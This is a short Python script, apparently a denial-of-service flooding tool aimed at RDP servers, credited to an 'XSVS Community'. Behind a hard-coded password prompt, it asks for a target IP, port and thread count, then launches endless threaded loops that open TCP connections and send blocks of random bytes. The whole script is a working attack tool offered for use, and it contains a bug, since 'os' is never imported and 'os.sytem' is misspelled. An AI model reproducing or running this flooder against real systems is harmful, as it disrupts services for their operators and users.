password = input('[+]PASSWORD:]')

if password == "RDPDDOS":
    print('Done !!!')
else:
          os.sytem('exit')
import random
import socket
import threading
# Info Tools
print("TOOLS BY XSVS COMMUNITY || PLEASE DON'T FCKING ABUSE !!!")
print("[+] Tools Create By : Xsvs Community")
print("[+] Credit Tools : JΣTZ")
print("[+] Don't Abuse The Tools")
print("------------------------------------------------")
ip = str(input("[/] Enter RDP IP : "))
port = int(input("[/] Enter RDP Port (80)   : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Thread (9024) : "))

def run():
    data = random._urandom(9024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] Attacking By XSVS COMMUNITY Rdp Auto Suspend=> ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()